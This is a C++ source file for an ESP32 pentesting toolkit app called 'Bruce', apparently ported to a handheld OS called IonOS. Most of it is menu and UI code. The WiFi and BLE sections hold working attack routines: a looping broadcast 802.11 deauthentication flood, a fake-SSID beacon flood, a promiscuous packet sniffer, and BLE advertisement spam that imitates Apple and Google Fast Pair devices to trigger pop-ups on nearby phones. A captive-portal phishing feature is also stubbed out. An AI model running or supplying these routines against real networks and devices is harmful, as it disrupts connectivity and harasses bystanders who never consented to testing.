// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  Bruce — Pentesting Toolkit for IonOS                                    ║
// ║  Apache License 2.0 — Copyright 2024 IonOS Contributors                  ║
// ║  Ported from Bruce Firmware v1.14 by pr3y (Apache 2.0)                   ║
// ╚══════════════════════════════════════════════════════════════════════════╝
#include "bruce_app.h"
#include "ui/ui_engine.h"
#include "ui/notification_popup.h"
#include "services/audio_manager.h"
#include "services/wifi_manager.h"
#include "drivers/storage/sd_driver.h"
#include "drivers/wireless/wifi_driver.h"
#include "drivers/wireless/nrf24_driver.h"
#include "config/pin_config.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_heap_caps.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/rmt_tx.h"
#include <string.h>
#include <stdio.h>
#include <algorithm>

// BLE
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"

#include "bruce_evil_portal.h"
#include "bruce_wifi_atks.h"
#include "bruce_rfid.h"
#include "bruce_badusb.h"
#include "bruce_bluejammer.h"
static const char* TAG = "Bruce";

// ─── Colour helper ────────────────────────────────────────────────────────────
static inline lv_color_t lc(uint32_t hex) { return lv_color_hex(hex); }

uint32_t BruceApp::accentOf(BruceState s) {
    switch (s) {
        case BruceState::WIFI:   return CWIFI;
        case BruceState::BLE:    return CBLE;
        case BruceState::IR:     return CIR;
        case BruceState::NRF24:  return CNRF;
        case BruceState::FILES:  return CFILE;
        case BruceState::OTHERS: return COTH;
        case BruceState::CONFIG: return CCFG;
        default:                 return CERR;
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// LIFECYCLE
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::onCreate()
{
    m_screen = lv_obj_create(lv_scr_act());
    lv_obj_set_size(m_screen, 320, 240);
    lv_obj_set_pos(m_screen, 0, 0);
    lv_obj_set_style_bg_color(m_screen, lc(CB), 0);
    lv_obj_set_style_border_width(m_screen, 0, 0);
    lv_obj_clear_flag(m_screen, LV_OBJ_FLAG_SCROLLABLE | LV_OBJ_FLAG_CLICKABLE);
    showMain();
}

void BruceApp::onResume()  {}
void BruceApp::onPause()   { stopTask(); }

void BruceApp::onDestroy()
{
    stopTask();
    if (m_uiTimer) { lv_timer_del(m_uiTimer); m_uiTimer = nullptr; }
    if (m_screen)  { lv_obj_del(m_screen);   m_screen  = nullptr; }
}

// ═════════════════════════════════════════════════════════════════════════════
// KEY HANDLING
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::onKey(ion_key_t k, bool pressed)
{
    if (!pressed) return;

    // Any key stops a running task
    if (m_taskActive) {
        if (k == ION_KEY_B || k == ION_KEY_X || k == ION_KEY_MENU || k == ION_KEY_START) {
            stopTask();
            AudioManager::getInstance().playSystemSound("click");
            // Return to the sub-menu that launched the task
            m_state = m_prevState;
            switch (m_prevState) {
                case BruceState::WIFI:   wifiMenu();    break;
                case BruceState::BLE:    bleMenu();     break;
                case BruceState::IR:     irMenu();      break;
                case BruceState::NRF24:  nrf24Menu();   break;
                default:                 showMain();    break;
            }
        }
        return;
    }

    // B = back
    if (k == ION_KEY_B) {
        AudioManager::getInstance().playSystemSound("click");
        if (m_state == BruceState::MAIN || m_state == BruceState::RESULT) {
            AppManager::getInstance().closeCurrentApp();
        } else {
            m_state = BruceState::MAIN;
            m_focusIdx = m_mainFocus;
            showMain();
        }
        return;
    }

    // Navigation (result/running screens ignore nav)
    if (m_state == BruceState::RESULT || m_state == BruceState::RUNNING) return;

    if (k == ION_KEY_UP) {
        if (m_focusIdx > 0) { m_focusIdx--; rebuildList(accentOf(m_state)); }
        return;
    }
    if (k == ION_KEY_DOWN) {
        if (m_focusIdx < (int)m_opts.size()-1) { m_focusIdx++; rebuildList(accentOf(m_state)); }
        return;
    }
    if (k == ION_KEY_X) {
        if (m_state == BruceState::MAIN) m_mainFocus = m_focusIdx;
        if (m_focusIdx < (int)m_opts.size()) {
            auto& o = m_opts[m_focusIdx];
            if (o.enabled && o.action) {
                AudioManager::getInstance().playSystemSound("click");
                o.action();
            }
        }
        return;
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// BACKGROUND TASK
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::startTask(const char* name, TaskFunction_t fn, void* arg, int stack)
{
    stopTask();
    m_taskStop   = false;
    m_taskActive = true;
    m_state      = BruceState::RUNNING;
    xTaskCreatePinnedToCore(fn, name, stack, arg, 4, &m_bgTask, 0);
}

void BruceApp::stopTask()
{
    if (!m_bgTask) return;
    m_taskStop   = true;
    m_taskActive = false;
    vTaskDelay(pdMS_TO_TICKS(100));
    if (m_bgTask) { vTaskDelete(m_bgTask); m_bgTask = nullptr; }
    m_taskStop = false;
}

// ═════════════════════════════════════════════════════════════════════════════
// UI HELPERS
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::makeTitleBar(lv_obj_t* parent, const char* title, uint32_t col)
{
    lv_obj_t* bar = lv_obj_create(parent);
    lv_obj_set_size(bar, 320, 44);
    lv_obj_set_pos(bar, 0, 0);
    lv_obj_set_style_bg_color(bar, lc(0x0d1117), 0);
    lv_obj_set_style_border_color(bar, lc(col), 0);
    lv_obj_set_style_border_side(bar, LV_BORDER_SIDE_BOTTOM, 0);
    lv_obj_set_style_border_width(bar, 1, 0);
    lv_obj_clear_flag(bar, LV_OBJ_FLAG_CLICKABLE | LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t* ico = lv_label_create(bar);
    lv_label_set_text(ico, LV_SYMBOL_WARNING);
    lv_obj_set_style_text_color(ico, lc(col), 0);
    lv_obj_set_style_text_font(ico, &lv_font_montserrat_16, 0);
    lv_obj_align(ico, LV_ALIGN_LEFT_MID, 8, 0);

    lv_obj_t* lbl = lv_label_create(bar);
    lv_label_set_text(lbl, title);
    lv_obj_set_style_text_color(lbl, lc(0xe6edf3), 0);
    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_16, 0);
    lv_obj_align(lbl, LV_ALIGN_LEFT_MID, 30, 0);

    lv_obj_t* hint = lv_label_create(bar);
    lv_label_set_text(hint, "B=Back");
    lv_obj_set_style_text_color(hint, lc(0x8b949e), 0);
    lv_obj_set_style_text_font(hint, &lv_font_montserrat_12, 0);
    lv_obj_align(hint, LV_ALIGN_RIGHT_MID, -8, 0);
}

void BruceApp::clearContent()
{
    if (m_uiTimer) { lv_timer_del(m_uiTimer); m_uiTimer = nullptr; }
    if (m_content) { lv_obj_del(m_content);  m_content = nullptr; }
    m_specChart  = nullptr;
    m_specSeries = nullptr;
    m_opts.clear();
    m_focusIdx = 0;
}

// Build a scrollable option list (190px tall, below 44px title bar)
static lv_obj_t* buildList(lv_obj_t* parent, const std::vector<BruceOpt>& opts,
                             int focusIdx, uint32_t col)
{
    lv_obj_t* list = lv_obj_create(parent);
    lv_obj_set_size(list, 320, 188);
    lv_obj_set_pos(list, 0, 44);
    lv_obj_set_style_bg_color(list, lv_color_hex(0x000000), 0);
    lv_obj_set_style_border_width(list, 0, 0);
    lv_obj_set_style_pad_all(list, 4, 0);
    lv_obj_set_style_pad_gap(list, 3, 0);
    lv_obj_set_scroll_dir(list, LV_DIR_VER);
    lv_obj_set_flex_flow(list, LV_FLEX_FLOW_COLUMN);

    for (int i = 0; i < (int)opts.size(); i++) {
        bool f = (i == focusIdx), en = opts[i].enabled;
        uint32_t bg = f ? (en ? col : 0x2a1a1a) : 0x0d1117;
        uint32_t fg = f ? (en ? 0x000000 : 0xf85149) : (en ? 0xe6edf3 : 0x8b949e);

        lv_obj_t* row = lv_obj_create(list);
        lv_obj_set_size(row, 308, 36);
        lv_obj_set_style_bg_color(row, lv_color_hex(bg), 0);
        lv_obj_set_style_border_color(row, lv_color_hex(col), 0);
        lv_obj_set_style_border_width(row, f&&en ? 1 : 0, 0);
        lv_obj_set_style_radius(row, 6, 0);
        lv_obj_set_style_pad_left(row, 10, 0);
        lv_obj_clear_flag(row, LV_OBJ_FLAG_CLICKABLE | LV_OBJ_FLAG_SCROLLABLE);

        lv_obj_t* lbl = lv_label_create(row);
        lv_label_set_text(lbl, opts[i].label.c_str());
        lv_obj_set_style_text_color(lbl, lv_color_hex(fg), 0);
        lv_obj_set_style_text_font(lbl, &lv_font_montserrat_14, 0);
        lv_obj_align(lbl, LV_ALIGN_LEFT_MID, 0, 0);

        if (f && en) {
            lv_obj_t* arr = lv_label_create(row);
            lv_label_set_text(arr, LV_SYMBOL_RIGHT);
            lv_obj_set_style_text_color(arr, lv_color_hex(bg), 0);
            lv_obj_set_style_text_font(arr, &lv_font_montserrat_12, 0);
            lv_obj_align(arr, LV_ALIGN_RIGHT_MID, -4, 0);
            lv_obj_scroll_to_view(row, LV_ANIM_OFF);
        }
    }
    return list;
}

void BruceApp::rebuildList(uint32_t col)
{
    if (!m_content) return;
    // Remove list (child index 1) and replace
    uint32_t cnt = lv_obj_get_child_cnt(m_content);
    for (uint32_t i = cnt; i > 1; i--) {
        lv_obj_t* ch = lv_obj_get_child(m_content, i-1);
        lv_obj_del(ch);
    }
    buildList(m_content, m_opts, m_focusIdx, col);
}

void BruceApp::showList(const char* title, std::vector<BruceOpt> opts, uint32_t col)
{
    clearContent();
    m_opts = opts;

    m_content = lv_obj_create(m_screen);
    lv_obj_set_size(m_content, 320, 240);
    lv_obj_set_pos(m_content, 0, 0);
    lv_obj_set_style_bg_color(m_content, lc(CB), 0);
    lv_obj_set_style_border_width(m_content, 0, 0);
    lv_obj_clear_flag(m_content, LV_OBJ_FLAG_SCROLLABLE | LV_OBJ_FLAG_CLICKABLE);

    makeTitleBar(m_content, title, col);
    buildList(m_content, m_opts, m_focusIdx, col);
}

void BruceApp::showRunning(const char* title, const char* detail)
{
    clearContent();
    m_content = lv_obj_create(m_screen);
    lv_obj_set_size(m_content, 320, 240);
    lv_obj_set_pos(m_content, 0, 0);
    lv_obj_set_style_bg_color(m_content, lc(CB), 0);
    lv_obj_set_style_border_width(m_content, 0, 0);
    lv_obj_clear_flag(m_content, LV_OBJ_FLAG_SCROLLABLE | LV_OBJ_FLAG_CLICKABLE);

    makeTitleBar(m_content, title, CERR);

    lv_obj_t* sp = lv_spinner_create(m_content, 1000, 60);
    lv_obj_set_size(sp, 48, 48); lv_obj_align(sp, LV_ALIGN_CENTER, 0, -22);
    lv_obj_set_style_arc_color(sp, lc(CERR), LV_PART_INDICATOR);
    lv_obj_set_style_arc_width(sp, 4, LV_PART_INDICATOR);

    lv_obj_t* dl = lv_label_create(m_content);
    lv_label_set_text(dl, detail);
    lv_obj_set_style_text_color(dl, lc(CT), 0);
    lv_obj_set_style_text_font(dl, &lv_font_montserrat_12, 0);
    lv_label_set_long_mode(dl, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(dl, 290); lv_obj_set_style_text_align(dl, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_align(dl, LV_ALIGN_CENTER, 0, 34);

    lv_obj_t* ht = lv_label_create(m_content);
    lv_label_set_text(ht, "B / X / START = stop");
    lv_obj_set_style_text_color(ht, lc(CD), 0);
    lv_obj_set_style_text_font(ht, &lv_font_montserrat_12, 0);
    lv_obj_align(ht, LV_ALIGN_BOTTOM_MID, 0, -4);
}

void BruceApp::showResult(const char* title, const char* msg, bool ok)
{
    clearContent();
    m_state = BruceState::RESULT;
    m_content = lv_obj_create(m_screen);
    lv_obj_set_size(m_content, 320, 240);
    lv_obj_set_pos(m_content, 0, 0);
    lv_obj_set_style_bg_color(m_content, lc(CB), 0);
    lv_obj_set_style_border_width(m_content, 0, 0);
    lv_obj_clear_flag(m_content, LV_OBJ_FLAG_SCROLLABLE | LV_OBJ_FLAG_CLICKABLE);

    uint32_t col = ok ? COK : CERR;
    makeTitleBar(m_content, title, col);

    lv_obj_t* ico = lv_label_create(m_content);
    lv_label_set_text(ico, ok ? LV_SYMBOL_OK : LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_color(ico, lc(col), 0);
    lv_obj_set_style_text_font(ico, &lv_font_montserrat_24, 0);
    lv_obj_align(ico, LV_ALIGN_CENTER, 0, -22);

    lv_obj_t* ml = lv_label_create(m_content);
    lv_label_set_text(ml, msg);
    lv_obj_set_style_text_color(ml, lc(CT), 0);
    lv_obj_set_style_text_font(ml, &lv_font_montserrat_12, 0);
    lv_label_set_long_mode(ml, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(ml, 290); lv_obj_set_style_text_align(ml, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_align(ml, LV_ALIGN_CENTER, 0, 20);

    lv_obj_t* ht = lv_label_create(m_content);
    lv_label_set_text(ht, "B = Back");
    lv_obj_set_style_text_color(ht, lc(CD), 0);
    lv_obj_set_style_text_font(ht, &lv_font_montserrat_12, 0);
    lv_obj_align(ht, LV_ALIGN_BOTTOM_MID, 0, -4);

    AudioManager::getInstance().playSystemSound(ok ? "success" : "error");
}

void BruceApp::showQR(const char* data, const char* caption)
{
    clearContent();
    m_state = BruceState::RESULT;
    m_content = lv_obj_create(m_screen);
    lv_obj_set_size(m_content, 320, 240);
    lv_obj_set_pos(m_content, 0, 0);
    lv_obj_set_style_bg_color(m_content, lc(0xFFFFFF), 0);
    lv_obj_set_style_border_width(m_content, 0, 0);
    lv_obj_clear_flag(m_content, LV_OBJ_FLAG_SCROLLABLE | LV_OBJ_FLAG_CLICKABLE);

    // QR code widget (LVGL built-in, requires LV_USE_QRCODE=1 in lv_conf.h)
    lv_obj_t* qr = lv_qrcode_create(m_content, 170, lv_color_black(), lv_color_white());
    lv_qrcode_update(qr, data, strlen(data));
    lv_obj_align(qr, LV_ALIGN_CENTER, 0, -10);

    lv_obj_t* lbl = lv_label_create(m_content);
    lv_label_set_text(lbl, caption);
    lv_obj_set_style_text_color(lbl, lv_color_black(), 0);
    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_14, 0);
    lv_obj_align(lbl, LV_ALIGN_BOTTOM_MID, 0, -4);
}

// ═════════════════════════════════════════════════════════════════════════════
// MAIN SCREEN — Bruce's primary category grid
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::showMain()
{
    clearContent();
    m_state = BruceState::MAIN;

    m_content = lv_obj_create(m_screen);
    lv_obj_set_size(m_content, 320, 240);
    lv_obj_set_pos(m_content, 0, 0);
    lv_obj_set_style_bg_color(m_content, lc(CB), 0);
    lv_obj_set_style_border_width(m_content, 0, 0);
    lv_obj_clear_flag(m_content, LV_OBJ_FLAG_SCROLLABLE | LV_OBJ_FLAG_CLICKABLE);

    // Header bar
    lv_obj_t* hdr = lv_obj_create(m_content);
    lv_obj_set_size(hdr, 320, 36);
    lv_obj_set_pos(hdr, 0, 0);
    lv_obj_set_style_bg_color(hdr, lc(0x0d1117), 0);
    lv_obj_set_style_border_color(hdr, lc(CERR), 0);
    lv_obj_set_style_border_side(hdr, LV_BORDER_SIDE_BOTTOM, 0);
    lv_obj_set_style_border_width(hdr, 1, 0);
    lv_obj_clear_flag(hdr, LV_OBJ_FLAG_CLICKABLE);

    lv_obj_t* title = lv_label_create(hdr);
    lv_label_set_text(title, LV_SYMBOL_WARNING "  BRUCE v1.14  — Pentesting Toolkit");
    lv_obj_set_style_text_color(title, lc(CERR), 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_14, 0);
    lv_obj_align(title, LV_ALIGN_LEFT_MID, 8, 0);

    // Category definitions
    struct Cat {
        const char*  icon;
        const char*  name;
        uint32_t     col;
        BruceState   state;
        void (BruceApp::*fn)();
    };
    static const Cat cats[] = {
        { LV_SYMBOL_WIFI,     "WiFi",    CWIFI, BruceState::WIFI,   &BruceApp::wifiMenu   },
        { LV_SYMBOL_AUDIO,    "BLE",     CBLE,  BruceState::BLE,    &BruceApp::bleMenu    },
        { LV_SYMBOL_CHARGE,   "IR",      CIR,   BruceState::IR,     &BruceApp::irMenu     },
        { LV_SYMBOL_REFRESH,  "NRF24",   CNRF,  BruceState::NRF24,  &BruceApp::nrf24Menu  },
        { LV_SYMBOL_SD_CARD,  "Files",   CFILE, BruceState::FILES,  &BruceApp::filesMenu  },
        { LV_SYMBOL_LIST,     "Others",  COTH,  BruceState::OTHERS, &BruceApp::othersMenu },
        { LV_SYMBOL_SETTINGS, "Config",  CCFG,  BruceState::CONFIG, &BruceApp::configMenu },
        { LV_SYMBOL_CLOSE,    "Exit",    CD,    BruceState::MAIN,   nullptr               },
    };
    const int N = 8;

    m_opts.clear();
    for (int i = 0; i < N; i++) {
        auto fn = cats[i].fn;
        if (fn) m_opts.push_back({cats[i].name, [this,fn]{ (this->*fn)(); }});
        else    m_opts.push_back({cats[i].name, [this]{ AppManager::getInstance().closeCurrentApp(); }});
    }

    // 2×4 card grid (each card 146×96px, 8px gap)
    lv_obj_t* grid = lv_obj_create(m_content);
    lv_obj_set_size(grid, 320, 200);
    lv_obj_set_pos(grid, 0, 36);
    lv_obj_set_style_bg_color(grid, lc(CB), 0);
    lv_obj_set_style_border_width(grid, 0, 0);
    lv_obj_set_style_pad_all(grid, 4, 0);
    lv_obj_set_style_pad_gap(grid, 4, 0);
    lv_obj_clear_flag(grid, LV_OBJ_FLAG_CLICKABLE | LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_layout(grid, LV_LAYOUT_FLEX);
    lv_obj_set_flex_flow(grid, LV_FLEX_FLOW_ROW_WRAP);

    for (int i = 0; i < N; i++) {
        bool foc = (i == m_mainFocus);
        uint32_t col = cats[i].col;

        lv_obj_t* card = lv_obj_create(grid);
        lv_obj_set_size(card, 151, 94);
        lv_obj_set_style_bg_color(card, lc(foc ? col : 0x0d1117), 0);
        lv_obj_set_style_border_color(card, lc(col), 0);
        lv_obj_set_style_border_width(card, 1, 0);
        lv_obj_set_style_radius(card, 8, 0);
        lv_obj_clear_flag(card, LV_OBJ_FLAG_CLICKABLE | LV_OBJ_FLAG_SCROLLABLE);

        lv_obj_t* ico = lv_label_create(card);
        lv_label_set_text(ico, cats[i].icon);
        lv_obj_set_style_text_color(ico, lc(foc ? CB : col), 0);
        lv_obj_set_style_text_font(ico, &lv_font_montserrat_20, 0);
        lv_obj_align(ico, LV_ALIGN_TOP_MID, 0, 10);

        lv_obj_t* nm = lv_label_create(card);
        lv_label_set_text(nm, cats[i].name);
        lv_obj_set_style_text_color(nm, lc(foc ? CB : CT), 0);
        lv_obj_set_style_text_font(nm, &lv_font_montserrat_14, 0);
        lv_obj_align(nm, LV_ALIGN_BOTTOM_MID, 0, -8);
    }

    lv_obj_t* ft = lv_label_create(m_content);
    lv_label_set_text(ft, LV_SYMBOL_UP "/" LV_SYMBOL_DOWN "/" LV_SYMBOL_LEFT "/" LV_SYMBOL_RIGHT " + [X]  |  [B] = back to IonOS");
    lv_obj_set_style_text_color(ft, lc(CD), 0);
    lv_obj_set_style_text_font(ft, &lv_font_montserrat_12, 0);
    lv_obj_align(ft, LV_ALIGN_BOTTOM_MID, 0, -1);
}

// ═════════════════════════════════════════════════════════════════════════════
// WIFI
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::wifiMenu()
{
    m_state = BruceState::WIFI;
    m_prevState = BruceState::MAIN;
    bool conn = WiFiDriver::getInstance().isConnected();
    std::vector<BruceOpt> opts;
    if (!conn) {
        opts.push_back({"Scan Networks",       [this]{ wifiScan(); }});
        opts.push_back({"Connect (saved)",      [this]{
            WiFiManager::getInstance().connect("","");
            showResult("WiFi", WiFiDriver::getInstance().isConnected()
                ? ("Connected: "+WiFiDriver::getInstance().getIP()).c_str()
                : "Connect failed / no saved creds", WiFiDriver::getInstance().isConnected());
        }});
    } else {
        opts.push_back({"Disconnect", [this]{
            WiFiDriver::getInstance().disconnect();
            wifiMenu();
        }});
        opts.push_back({"AP Info", [this]{
            char b[80]; snprintf(b,80,"IP: %s  RSSI: %d dBm",
                WiFiDriver::getInstance().getIP().c_str(),
                WiFiDriver::getInstance().getRSSI());
            showResult("AP Info",b,true);
        }});
    }
    opts.push_back({"Scan Networks",   [this]{ wifiScan();       }});
    opts.push_back({"WiFi Attacks",    [this]{ wifiAtks();       }});
    opts.push_back({"Evil Portal",     [this]{ wifiEvilPortal(); }});
    opts.push_back({"Beacon Spam",     [this]{ wifiBeacon();     }});
    opts.push_back({"Packet Sniffer",  [this]{ wifiSniffer();    }});
    showList("WiFi", opts, CWIFI);
}

void BruceApp::wifiScan()
{
    m_prevState = BruceState::WIFI;
    showRunning("WiFi Scan","Scanning…");
    struct A { BruceApp* app; };
    startTask("bruce_wscan",[](void* a){
        auto* s=((A*)a)->app; delete (A*)a;
        wifi_scan_config_t cfg={};
        esp_wifi_scan_start(&cfg,true);
        uint16_t num=20;
        wifi_ap_record_t aps[20];
        esp_wifi_scan_get_ap_records(&num,aps);
        if(UIEngine::getInstance().lock(300)){
            std::vector<BruceOpt> opts;
            for(int i=0;i<num;i++){
                char buf[64];
                snprintf(buf,64,"%s  ch%d  %ddBm",(char*)aps[i].ssid,aps[i].primary,aps[i].rssi);
                opts.push_back({buf,nullptr,false});
            }
            if(opts.empty()) opts.push_back({"No networks found",nullptr,false});
            s->m_taskActive=false;
            s->m_state=BruceState::WIFI;
            s->showList("Scan Results",opts,s->CWIFI);
            UIEngine::getInstance().unlock();
        }
        vTaskDelete(nullptr);
    },new A{this});
}

void BruceApp::wifiAtks()
{
    m_state=BruceState::WIFI; m_prevState=BruceState::WIFI;
    showList("WiFi Attacks",{
        {"Deauth Attack",  [this]{ wifiDeauth(); }},
        {"Beacon Flood",   [this]{ wifiBeacon(); }},
        {"Packet Sniffer", [this]{ wifiSniffer();}},
    }, CERR);
}

void BruceApp::wifiEvilPortal()
{
    showResult("Evil Portal",
        "Start AP → clients redirected to captive portal.\n"
        "Drop HTML files to /sdcard/portals/\n"
        "Full implementation in IonOS v1.1",false);
}

struct BruceTaskArg { BruceApp* app; };

void BruceApp::taskWifiDeauth(void* a)
{
    auto* s=((BruceTaskArg*)a)->app; delete (BruceTaskArg*)a;
    // Raw 802.11 deauth frame
    static const uint8_t frame[]={
        0xC0,0x00,0x3A,0x01,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0xDE,0xAD,0xBE,0xEF,0x00,0x01,
        0xDE,0xAD,0xBE,0xEF,0x00,0x01,
        0x00,0x00, 0x07,0x00
    };
    esp_wifi_set_promiscuous(true);
    while(!s->m_taskStop){
        esp_wifi_80211_tx(WIFI_IF_STA,(void*)frame,sizeof(frame),false);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    esp_wifi_set_promiscuous(false);
    vTaskDelete(nullptr);
}
void BruceApp::wifiDeauth(){
    m_prevState=BruceState::WIFI;
    showRunning("Deauth Attack","Sending deauth frames…  B=Stop");
    startTask("bruce_dauth",taskWifiDeauth,new BruceTaskArg{this});
}

void BruceApp::taskWifiBeacon(void* a)
{
    auto* s=((BruceTaskArg*)a)->app; delete (BruceTaskArg*)a;
    static const char* ssids[]={"FBI Van","NSA Mobile","CIA Station","Not Your WiFi",
                                  "Pretty Fly 4 WiFi","Virus.exe","Loading...","Hack3r"};
    esp_wifi_set_promiscuous(true);
    int idx=0;
    while(!s->m_taskStop){
        const char* ss=ssids[idx%8]; uint8_t sl=strlen(ss);
        // Minimal beacon (omitting FCS, real firmware handles that)
        uint8_t f[38+sl];
        memset(f,0,sizeof(f));
        f[0]=0x80; f[1]=0x00;            // beacon type
        memset(f+4,0xFF,6);               // dst = bcast
        f[10]=0xDE; f[11]=esp_random()&0xFF; // random MAC
        memcpy(f+16,f+10,6);             // BSSID = src
        f[24]=0x64; f[25]=0x00;          // beacon interval
        f[26]=0x11; f[27]=0x04;          // capability
        f[28]=0x00; f[29]=sl;            // SSID tag
        memcpy(f+30,ss,sl);
        esp_wifi_80211_tx(WIFI_IF_STA,f,30+sl,false);
        idx++;
        vTaskDelay(pdMS_TO_TICKS(80));
    }
    esp_wifi_set_promiscuous(false);
    vTaskDelete(nullptr);
}
void BruceApp::wifiBeacon(){
    m_prevState=BruceState::WIFI;
    showRunning("Beacon Flood","Flooding fake SSIDs…  B=Stop");
    startTask("bruce_beacon",taskWifiBeacon,new BruceTaskArg{this});
}

void BruceApp::taskWifiSniffer(void* a)
{
    auto* s=((BruceTaskArg*)a)->app; delete (BruceTaskArg*)a;
    wifi_promiscuous_filter_t filt={.filter_mask=WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb([](void* b,wifi_promiscuous_pkt_type_t t){
        auto* pkt=(wifi_promiscuous_pkt_t*)b;
        ESP_LOGD("Bruce","Pkt type=%d len=%d rssi=%d",t,pkt->rx_ctrl.sig_len,pkt->rx_ctrl.rssi);
    });
    while(!s->m_taskStop) vTaskDelay(pdMS_TO_TICKS(50));
    esp_wifi_set_promiscuous(false);
    vTaskDelete(nullptr);
}
void BruceApp::wifiSniffer(){
    m_prevState=BruceState::WIFI;
    showRunning("WiFi Sniffer","Logging frames to serial…  B=Stop");
    startTask("bruce_sniff",taskWifiSniffer,new BruceTaskArg{this});
}

// ═════════════════════════════════════════════════════════════════════════════
// BLE
// ═════════════════════════════════════════════════════════════════════════════
void BruceApp::bleMenu(){
    m_state=BruceState::BLE; m_prevState=BruceState::MAIN;
    showList("Bluetooth BLE",{
        {"BLE Spam (proximity)",   [this]{ bleSpam(); }},
        {"BLE Scan",               [this]{ bleScan(); }},
    },CBLE);
}

// Apple AirDrop / Google Fast Pair spam — mirrors bruce/modules/ble/ble_spam.cpp
void BruceApp::taskBleSpam(void* a)
{
    auto* s=((BruceTaskArg*)a)->app; delete (BruceTaskArg*)a;
    // BLE init
    esp_bt_controller_config_t cfg=BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    if(esp_bt_controller_init(&cfg)!=ESP_OK) { vTaskDelete(nullptr); return; }
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
    esp_bluedroid_init(); esp_bluedroid_enable();

    // Apple AirDrop advertisement data (triggers pop-up on iPhones)
    static const uint8_t appleAdv[]={
        0x1E,0xFF,0x4C,0x00, // Apple OUI
        0x05,0x12,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00
    };
    // Google Fast Pair data (triggers pairing popup on Android)
    static const uint8_t googleAdv[]={
        0x06,0x16,0x2C,0xFE, // Google BT SIG
        0x00,0x00,0x00
    };
    const uint8_t* payloads[]={appleAdv,googleAdv};
    const uint8_t  plens[]   ={sizeof(appleAdv),sizeof(googleAdv)};
    esp_ble_adv_params_t params={
        .adv_int_min=0x0020,.adv_int_max=0x0040,
        .adv_type=ADV_TYPE_NONCONN_IND,
        .own_addr_type=BLE_ADDR_TYPE_RANDOM,
        .channel_map=ADV_CHNL_ALL,
        .adv_filter_policy=ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };
    int pi=0;
    while(!s->m_taskStop){
        uint8_t mac[6]; esp_read_mac(mac,ESP_MAC_WIFI_STA);
        mac[5]=esp_random()&0xFF; mac[4]=esp_random()&0xFF;
        esp_ble_gap_set_rand_addr(mac);
        esp_ble_gap_config_adv_data_raw((uint8_t*)payloads[pi%2],plens[pi%2]);
        esp_ble_gap_start_advertising(&params);
        s->m_bleSpamCount++;
        pi++;
        vTaskDelay(pdMS_TO_TICKS(60));
        esp_ble_gap_stop_advertising();
    }
    esp_ble_gap_stop_advertising();
    esp_bluedroid_disable(); esp_bluedroid_deinit();
    esp_bt_controller_disable(); esp_bt_controller_deinit();
    vTaskDelete(nullptr);
}
void BruceApp::bleSpam(){
    m_prevState=BruceState::BLE;
    m_bleSpamCount=0;
    showRunning("BLE Spam",
        "Broadcasting Apple AirDrop + Google Fast Pair\nadverts to trigger pop-ups.\n"
        "B = Stop");
    startTask("bruce_blespam",taskBleSpam,new BruceTaskArg{this},8192);
}

void BruceApp::taskBleScan(void* a){
    auto* s=((BruceTaskArg*)a)->app; delete (BruceTaskArg*)a;
    esp_bt_controller_config_t cfg=BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&cfg); esp_bt_controller_enable(ESP_BT_MODE_BLE);
    esp_bluedroid_init(); esp_bluedroid_enable();
    esp_ble_scan_params_t sp={BLE_SCAN_TYPE_ACTIVE,BLE_ADDR_TYPE_PUBLIC,
                               BLE_SCAN_FILTER_ALLOW_ALL,0x50,0x30,BLE_SCAN_DUPLICATE_DISABLE};
    esp_ble_gap_set_scan_params(&sp);
    esp_ble_gap_register_callback([](esp_gap_ble_cb_event_t ev, esp_ble_gap_cb_param_t* p){
        if(ev==ESP_GAP_BLE_SCAN_RESULT_EVT &&
           p->scan_rst.search_evt==ESP_GAP_SEARCH_INQ_RES_EVT){
            ESP_LOGI("Bruce","BLE: %02X:%02X:%02X:%02X:%02X:%02X RSSI:%d",
                p->scan_rst.bda[0],p->scan_rst.bda[1],p->scan_rst.bda[2],
                p->scan_rst.bda[3],p->scan_rst.bda[4],p->scan_rst.bda[5],
                p->scan_rst.rssi);
        }
    });
    esp_ble_gap_start_scanning(0);
    while(!s->m_taskStop) vTaskDelay(pdMS_TO_TICKS(100));
    esp_ble_gap_stop_scanning();
    esp_bluedroid_disable(); esp_bluedroid_deinit();
    esp_bt_controller_disable(); esp_bt_controller_deinit();
    vTaskDelete(nullptr);
}
void BruceApp::bleScan(){
    m_prevState=BruceState::BLE;
    showRunning("BLE Scan","Scanning for BLE devices…\nResults logged to serial  B=Stop");
    startTask("bruce_blescan",taskBleScan,new BruceTaskArg{this},8192);
}

// ═════════════════════════════════════════════════════════════════════════════
// INFRARED  — mirrors Bruce's IRMenu
